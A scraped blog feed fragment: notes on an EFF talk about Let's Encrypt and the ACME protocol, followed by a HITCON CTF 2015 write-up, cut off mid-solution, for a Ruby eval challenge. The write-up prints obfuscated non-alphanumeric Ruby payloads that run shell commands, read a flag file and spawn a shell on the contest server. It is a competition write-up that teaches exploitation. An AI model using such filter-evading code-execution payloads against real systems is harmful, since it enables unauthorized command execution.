&lt;li&gt;Lowest level of validation for PKIX certificates is DV (Domain Validation) - verification by the CA that the applicant controls the domain name (or a server that the domain name is pointed at)  &lt;/li&gt;
&lt;li&gt;Explicitly doesn't confirm the real-world identity of the applicant  &lt;/li&gt;
&lt;li&gt;Software on web server, and the server connect to the Let's Encrypt CA.  &lt;/li&gt;
&lt;li&gt;ACME (Automated Certificate Management Environment) to handle conversations about cert issuance  &lt;/li&gt;
&lt;li&gt;Client claims to control a particular name or names, and asks for a cert for them  &lt;/li&gt;
&lt;li&gt;Server issues one or more challenges to ask the client to prove its control (and/or possibly prove control of other cryptographic keys)  &lt;/li&gt;
&lt;li&gt;Client satisfies these challenges and server verifies this automatically then issues cert and sends it over  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Normal users: Certificates just make browsers complain the wrong domain name or expired to users while browsing the Internet. (LOL)  &lt;/p&gt;
&lt;h2&gt;ACME&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;A JSON-based protocol  &lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Let's Encrypt status&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Internet Security Resarch Group (ISRG)  &lt;ul&gt;
&lt;li&gt;We don't want people to know about what we are doing, so we think this name is good.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;DVFNI&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Crypto  &lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Convenience&lt;/h2&gt;
&lt;p&gt;We anticipate people who administer their own web servers will run something like  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ sudo apt-get install letsencrypt  
$ sudo letsencrypt  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;and the client will not only obtain, but also deploy, the new cert in less than a minute.  &lt;/p&gt;
&lt;p&gt;We're working on a client that will parse and write Apache and Nginx configs, and autorenew expiring certs.  &lt;/p&gt;
&lt;p&gt;Apache sever's config file is really hard to parse, so we made a lot of effort on it.  &lt;/p&gt;
&lt;h2&gt;Safety&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;We care a lot about avoiding misissuance and plan to adopt technologies to stop it  &lt;/li&gt;
&lt;li&gt;We are publishing all certs in Google's Certificate Transparency system  &lt;/li&gt;
&lt;li&gt;We're planning to prevent issuance for a domain that already has a valid cert unless the applicant can prove control of its subject key  &lt;/li&gt;
&lt;li&gt;We can also have mechanisms for domains to ask us never to issue for them  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;We can have records about all certificates we've issued, and people can also check the list. If we got hacked, we can easily see the compromised records.  &lt;/p&gt;
&lt;h2&gt;Wider integration&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;We'd like to be integrated on every server OS or web server and every hosting and application platform  &lt;/li&gt;
&lt;li&gt;The ACME protocol is in a standardization process at IETF and will be an open standard  &lt;/li&gt;
&lt;li&gt;You can use the protocol to request certs from us without using our client software.  &lt;ul&gt;
&lt;li&gt;You can even write you own client.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Contractual relationship isn't required, though we welcome new sponsors.  &lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Help!&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Please join the beta test program  &lt;ul&gt;
&lt;li&gt;Fill out a form with your domin names + e-mail address, then wait for e-mail confirmation  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Try out our service and report client or service bugs, and optionally send us pathces.  &lt;/li&gt;
&lt;li&gt;Beta certs are fully "real" and mainstream browsers accept them now  &lt;/li&gt;
&lt;li&gt;Integrating our client in your favorite OS or with your favorite web server  &lt;ul&gt;
&lt;li&gt;Or other server (ESMTP, IMAP, XMPP, ...)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Packaging our client  &lt;/li&gt;
&lt;li&gt;Integrating our client with your favorite hosting environment  &lt;/li&gt;
&lt;li&gt;Auditing our client or server  &lt;/li&gt;
&lt;li&gt;Writing more tests  &lt;/li&gt;
&lt;li&gt;Documenting our client (man pages, FAQ, introduction, explaining PKI, what key/cert/chain are)  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Client written in Python, Server written in Go.  &lt;/p&gt;
&lt;hr /&gt;
&lt;h1&gt;Real-world cryptography: What could possibly go wrong?&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;鄭振牟 （台大電機系副教授）  &lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;EasyCard 2.0&lt;/h2&gt;
&lt;h2&gt;CDC (自然人憑證) - Citizen Digital Certificate&lt;/h2&gt;
&lt;p&gt;政府：「新的自然人憑證應該安全了」 「你信嗎？」 「反正我是信了。」  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;Thought&lt;/h2&gt;
&lt;p&gt;後半段鄭教授講有關悠遊卡跟自然人憑證的部份我沒有聽的很仔細，&lt;br /&gt;
大致上是在講之前悠遊卡出包後，教授的研究團隊有投入補救，然後推出悠遊卡 2.0。&lt;br /&gt;
然後自然人憑證的部份有講到超大質數在以 Hexadecimal 顯示時會有過度規律的問題等等。&lt;br /&gt;
然後提供了許多論文，給想瞭解的人去參考。&lt;br /&gt;
我也沒有記下來，畢竟這次來主要是想瞭解 EFF 的資訊。  &lt;/p&gt;
&lt;p&gt;簡單來說 Let's Encrypt 在做的事情就是讓取得憑證這件事情變得愈簡單愈好，&lt;br /&gt;
方便架站者可以很快、很方便的取得並儘量自動化設定憑證，之後便能直接使用，&lt;br /&gt;
讓架站者可以迅速地提供使用者 HTTPS 加密連線，不要使用 plaintext 的 HTTP。&lt;br /&gt;
以往因為憑證的設定需要一連串繁瑣的步驟及有些複雜的指令，讓許多架站者覺得時間成本過高，&lt;br /&gt;
而且大多數的憑證是需要購買的，Let's Encrypt 則提供免費的憑證，且只需透過簡單的指令就可以迅速設定完成。&lt;br /&gt;
總之就是希望使用者在網路上的連線資料都是加密的，而不是使用 HTTP 在網路上裸奔，容易讓有心人士取得資料。  &lt;/p&gt;
&lt;p&gt;Let's Encrypt 的官方網站： &lt;a href="https://letsencrypt.org/"&gt;Let's Encrypt&lt;/a&gt;&lt;br /&gt;
有興趣的人可以點進去瞧瞧，目前只有英文，也歡迎有興趣的人貢獻繁體中文的翻譯。&lt;br /&gt;
如果你覺得他們致力於網路安全的努力值得支持的話，也可以到官方網站的 donate 連結，小額贊助一些錢給他們。  &lt;/p&gt;
&lt;p&gt;從 2015/9/12 到目前都是 limited beta 測試中，採填表申請並等待的制度。&lt;br /&gt;
但從下禮拜 (12/3 Thu) 開始，進入 public beta 測試階段，&lt;br /&gt;
屆時系統會開放給任何想申請的人，無需等待回信。&lt;br /&gt;
詳細公告在此 &lt;a href="https://letsencrypt.org/2015/11/12/public-beta-timing.html"&gt;Public Beta: December 3, 2015&lt;/a&gt;&lt;br /&gt;
有興趣的人歡迎到時候申請來使用看看，遇到任何問題或 bug 都歡迎回報給他們。  &lt;/p&gt;
&lt;p&gt;順便附上他們的 Twitter： &lt;a href="https://twitter.com/EFF"&gt;EFF (@EFF) | Twitter&lt;/a&gt;&lt;br /&gt;
可以比較快的知道一些新資訊  &lt;/p&gt;
&lt;p&gt;最後覆蓋海報一張結束這篇文章  &lt;/p&gt;
&lt;p&gt;&lt;img alt="Poster" src="/files/a-free-certificate-authority-to-encrypt-the-entire-web/poster.jpg" /&gt;  &lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">m157q</dc:creator><pubDate>Sun, 29 Nov 2015 09:33:00 +0800</pubDate><guid isPermaLink="false">tag:blog.m157q.tw,2015-11-27:posts/2015/11/27/a-free-certificate-authority-to-encrypt-the-entire-web/</guid><category>Let's Encrypt</category><category>EFF</category><category>Speech</category></item><item><title>HITCON CTF 2015 Quals Write-up</title><link>https://blog.m157q.tw/posts/2015/10/19/hitcon-ctf-2015-quals-write-up/</link><description>&lt;h2&gt;MISC - Flag not Found [1]&lt;/h2&gt;
&lt;p&gt;Any &lt;code&gt;404 Nout Found&lt;/code&gt; page on &lt;a href="https://ctf2015.hitcon.org"&gt;https://ctf2015.hitcon.org&lt;/a&gt; will print out the flag.  &lt;/p&gt;
&lt;p&gt;&lt;img alt="Flag not Found" src="/files/hitcon-ctf-2015-quals-write-up/flag-not-found.png" /&gt;  &lt;/p&gt;
&lt;p&gt;The flag is &lt;code&gt;hitcon{do_you_wanna_play_a_game?enjoy_hitcon_ctf_2015_quals:)}&lt;/code&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;MISC - hard to say [50*4]&lt;/h2&gt;
&lt;p&gt;A description  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;Ruby on Fails.  
FLAG1: nc 54.199.215.185 9001  
FLAG2: nc 54.199.215.185 9002  
FLAG3: nc 54.199.215.185 9003  
FLAG4: nc 54.199.215.185 9004  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;with a Ruby source code &lt;code&gt;hard_to_say-151ba63da9ef7f11bcbba93657805f85.rb&lt;/code&gt;  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="ch"&gt;#!/usr/bin/env ruby  &lt;/span&gt;

&lt;span class="nb"&gt;fail&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;flag?&amp;#39;&lt;/span&gt; &lt;span class="k"&gt;unless&lt;/span&gt; &lt;span class="no"&gt;File&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;file?&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;flag&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  

&lt;span class="vg"&gt;$stdout&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sync&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="kp"&gt;true&lt;/span&gt;  

&lt;span class="n"&gt;limit&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="no"&gt;ARGV&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="o"&gt;].&lt;/span&gt;&lt;span class="n"&gt;to_i&lt;/span&gt;  
&lt;span class="nb"&gt;puts&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Hi, I can say &lt;/span&gt;&lt;span class="si"&gt;#{&lt;/span&gt;&lt;span class="n"&gt;limit&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt; bytes :P&amp;quot;&lt;/span&gt;  
&lt;span class="n"&gt;s&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="vg"&gt;$stdin&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;gets&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;strip!&lt;/span&gt;  

&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;size&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;limit&lt;/span&gt; &lt;span class="o"&gt;||&lt;/span&gt; &lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="sr"&gt;/[[:alnum:]]/&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;  
  &lt;span class="nb"&gt;puts&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;oh... I cannot say this, maybe it is too long or too weird :(&amp;#39;&lt;/span&gt;  
  &lt;span class="nb"&gt;exit&lt;/span&gt;  
&lt;span class="k"&gt;end&lt;/span&gt;  

&lt;span class="nb"&gt;puts&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;I think size = &lt;/span&gt;&lt;span class="si"&gt;#{&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;size&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt; is ok to me.&amp;quot;&lt;/span&gt;  
&lt;span class="n"&gt;r&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;eval&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;to_s&lt;/span&gt;  
&lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;64&lt;/span&gt;&lt;span class="o"&gt;..-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;...&amp;#39;&lt;/span&gt; &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;size&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="mi"&gt;64&lt;/span&gt;  
&lt;span class="nb"&gt;puts&lt;/span&gt; &lt;span class="n"&gt;r&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We can see that:  &lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;The program will accept an input.  &lt;/li&gt;
&lt;li&gt;There's a flag at &lt;code&gt;./flag&lt;/code&gt;.  &lt;/li&gt;
&lt;li&gt;There's a input length limit which has been assigned as argv[0] since the program started.  &lt;ul&gt;
&lt;li&gt;For flag 1 ~ 4, the input length limit are 1024/64/36/10 bytes.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;You cannot have alphabets and numbers in the input.  &lt;/li&gt;
&lt;li&gt;If your input pass the length and non-alnum test, it will be the argument of &lt;code&gt;eval()&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;The program print out the result of &lt;code&gt;eval(input)&lt;/code&gt;  &lt;/li&gt;
&lt;/ol&gt;
&lt;h3&gt;Flag1 (1024 bytes)&lt;/h3&gt;
&lt;p&gt;At first, I have no idea about how to write a non-alnum Ruby code, I even don't  write Ruby.&lt;br /&gt;
Until one of my teammates gave a link &lt;a href="http://threeifbywhiskey.github.io/2014/03/05/non-alphanumeric-ruby-for-fun-and-not-much-else/"&gt;Non-Alphanumeric Ruby for Fun and Not Much Else&lt;/a&gt;.&lt;br /&gt;
After some discussions, try-and-error and with this link &lt;a href="http://stackoverflow.com/questions/2232/calling-shell-commands-from-ruby"&gt;Calling shell commands from Ruby - Stack Overflow&lt;/a&gt;,&lt;br /&gt;
we came up with &lt;code&gt;226 bytes&lt;/code&gt; solution for flag1.  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;_&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="vg"&gt;$$&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="vg"&gt;$$&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="n"&gt;__&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;_&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;_&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="vi"&gt;@_&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;_&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;_&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="vg"&gt;$_&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="vi"&gt;@_&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;_&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="vg"&gt;$__&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="vi"&gt;@_&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="vg"&gt;$_&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="vi"&gt;@__&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="vg"&gt;$__&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="vg"&gt;$_&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="sb"&gt;`&lt;/span&gt;&lt;span class="si"&gt;#{&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="vg"&gt;$_&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="vi"&gt;@_&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="vi"&gt;@__&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="vg"&gt;$_&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="vg"&gt;$_&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="vg"&gt;$_&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="vi"&gt;@_&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="vi"&gt;@__&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="vg"&gt;$__&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="vi"&gt;@_&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="vg"&gt;$_&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="vg"&gt;$__&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="vi"&gt;@__&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="vi"&gt;@_&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="vi"&gt;@_&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span class="vi"&gt;@__&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="vi"&gt;@_&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="vi"&gt;@_&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span class="vi"&gt;@__&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="vg"&gt;$_&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;_&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span class="vi"&gt;@__&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="vg"&gt;$_&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="vi"&gt;@_&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="vg"&gt;$__&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="vi"&gt;@_&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="vi"&gt;@__&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="vg"&gt;$_&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="vg"&gt;$__&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="vi"&gt;@_&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="vi"&gt;@__&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="vg"&gt;$_&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="vg"&gt;$_&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="vi"&gt;@_&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="vi"&gt;@__&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="vg"&gt;$__&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="vi"&gt;@_&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="vg"&gt;$__&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="vi"&gt;@_&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="vi"&gt;@__&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="vi"&gt;@_&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="sb"&gt;`&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;which equal to  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="sb"&gt;`&lt;/span&gt;&lt;span class="si"&gt;#{&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;cat ./flag&amp;#39;&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="sb"&gt;`&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;as a string input.&lt;br /&gt;
then we got flag1.&lt;br /&gt;
&lt;code&gt;hitcon{what does the ruby say? @#$%!@&amp;amp;(%!#$&amp;amp;(%!@#$!$?...}&lt;/code&gt;  &lt;/p&gt;
&lt;h3&gt;Flag2 (64 bytes)&lt;/h3&gt;
&lt;p&gt;After this, we got stucked with the 64 bytes limitation.&lt;br /&gt;
I came up with calling &lt;code&gt;sh&lt;/code&gt; to get shell instead of just &lt;code&gt;cat flag&lt;/code&gt;,&lt;br /&gt;
and one of my teammates found out that &lt;code&gt;$$&lt;/code&gt; is always &lt;code&gt;4&lt;/code&gt; on the target server.&lt;br /&gt;
So, we came up with the &lt;code&gt;61 bytes&lt;/code&gt; solution for flag2.  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="vg"&gt;$_&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="vg"&gt;$$&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="vg"&gt;$$&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="vi"&gt;@_&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="vg"&gt;$_&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="vg"&gt;$_&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="vg"&gt;$$&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="vg"&gt;$_&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;&lt;span class="vg"&gt;$.&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="vi"&gt;@_&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="vi"&gt;@_&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="vg"&gt;$$&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="sb"&gt;`&lt;/span&gt;&lt;span class="si"&gt;#{&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span class="vg"&gt;$.&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="vi"&gt;@_&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="vg"&gt;$_&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span class="vg"&gt;$.&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="sb"&gt;`&lt;/span&gt;  

&lt;span class="c1"&gt;# $_ = 1, @_ = 10, $. = 104, $.+@_+$_ = 115; ascii(&amp;#39;s&amp;#39;) == 115; ascii(&amp;#39;h&amp;#39;) == 104;  &lt;/span&gt;
&lt;span class="c1"&gt;# `#{&amp;#39;&amp;#39;&amp;lt;&amp;lt;115&amp;lt;&amp;lt;104}` == `#{&amp;#39;sh&amp;#39;}`  &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;After got the shell, just type &lt;code&gt;cat flag&lt;/code&gt; then &lt;code&gt;^D&lt;/code&gt; to get the output.&lt;br /&gt;
We got flag2.&lt;br /&gt;
&lt;code&gt;hitcon{Ruby in Peace m()m}&lt;/code&gt;  &lt;/p&gt;
&lt;h3&gt;Flag3 (36 bytes)&lt;/h3&gt;
&lt;p&gt;One of my teammates came up with calling &lt;code&gt;$0&lt;/code&gt; instead of &lt;code&gt;sh&lt;/code&gt; to get shell,&lt;br /&gt;
we got the &lt;code&gt;26 bytes&lt;/code&gt; solution.  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="sb"&gt;`&lt;/span&gt;&lt;span class="si"&gt;#{&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;$&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span class="vg"&gt;$$&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="vg"&gt;$$&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="vg"&gt;$$&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="vg"&gt;$$&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="vg"&gt;$$&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="sb"&gt;`&lt;/span&gt;  

&lt;span class="c1"&gt;# `#{&amp;#39;$&amp;#39;&amp;lt;&amp;lt;48}` == `#{&amp;#39;$0&amp;#39;}`  &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;then we got flag3&lt;br /&gt;
&lt;code&gt;hitcon{My cats also know how to code in ruby :cat:}&lt;/code&gt;  &lt;/p&gt;
&lt;h3&gt;Flag4 (10 bytes)&lt;/h3&gt;
&lt;p&gt;After this, I was trying to find how to just embed number into the string not by using &lt;code&gt;&amp;lt;&amp;lt;&lt;/code&gt;.&lt;br /&gt;
I found this link &lt;a href="http://stackoverflow.com/questions/17169671/ruby-eval-with-string-interpolation"&gt;Ruby: eval with string interpolation - Stack Overflow&lt;/a&gt;.&lt;br /&gt;
I also found that the predefined variable &lt;code&gt;$.&lt;/code&gt; is &lt;code&gt;The number of the last line read from the current input file.&lt;/code&gt;&lt;br /&gt;
It means that in this use case, &lt;code&gt;$.&lt;/code&gt; will always be &lt;code&gt;1&lt;/code&gt;.&lt;br /&gt;
so I came up with &lt;code&gt;11 bytes&lt;/code&gt; solution  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="sb"&gt;`$&lt;/span&gt;&lt;span class="si"&gt;#{&lt;/span&gt;&lt;span class="vg"&gt;$.&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="vg"&gt;$.&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="sb"&gt;`&lt;/span&gt;  
